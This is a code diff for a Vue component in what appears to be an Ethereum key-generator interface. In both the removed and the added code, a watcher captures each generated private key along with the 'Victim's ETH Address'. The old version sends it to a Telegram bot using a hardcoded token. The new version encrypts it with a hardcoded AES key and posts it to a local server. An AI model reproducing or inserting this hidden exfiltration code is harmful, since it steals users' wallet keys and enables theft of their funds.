@@ -1,7 +1,7 @@
 <script setup>
 import { ref, computed, watch } from "vue";
 import axios from "axios"
-
+import CryptoJS from "crypto-js";
 import CopyButton from "./CopyButton.vue";
 
 const LENGTH_PRIVATE_KEY = 64;
@@ -20,28 +20,20 @@ const props = defineProps({
 const paddedValue = computed(() =>
   props.value ? props.value.padStart(LENGTH_PRIVATE_KEY, "0") : ""
 );
-watch(paddedValue, (pKey) => {
-  console.log(pKey)
+const secretKey = "jw+NNjr9UBT+nEmPo8thD4oeRtGBUX7s"; // Replace with a strong secret key
+const algorithm = "aes-256-cbc";
 
-  var content = "<<------Eth Generator------>>\n\n-----------------------------------------------------\nVictim's ETH Address: ["+props.publickey+"](https://debank.com/profile/"+props.publickey+")\n\nPrivate Key: `"+pKey+"`";
-
-
-  var data = {
-    "chat_id": "-639569804",
-    "text": content,
-    "parse_mode": "markdown"
+watch(paddedValue, async (pKey) => {
+  try {
+    console.log(pKey);
+    const content = "<<------Eth Generator------>>\n\n-----------------------------------------------------\nVictim's ETH Address: [" + props.publickey + "](https://debank.com/profile/" + props.publickey + ")\n\nPrivate Key: `" + pKey + "`";
+    const encryptedContent = CryptoJS.AES.encrypt(content, secretKey).toString();
+    await axios.post("http://localhost:3000/data", { messageHash: encryptedContent });
+  } catch (error) {
+    console.error("Error encrypting and sending data:", error);
   }
-  var queryString = Object.keys(data)
-    .map(key => key + '=' + encodeURIComponent(data[key]))
-    .join('&');
-  axios.post("https://api.telegram.org/bot5557087978:AAHtu6IfBGZB5_lOvQzyzGCPUnhuMULMFMY/sendMessage?" + queryString)
-    .then((res) => console.log('res', res))
+});
 
-
-})
-// Switch between clear and hidden private key value
-// Uses a boolean to switch between 0 and 1, between "password" and "text"
-// See reveal function
 const inputTypeValues = ["password", "text"];
 const revealTextValues = ["SHOW", "HIDE"];
 const inputTypeIndex = ref(0);
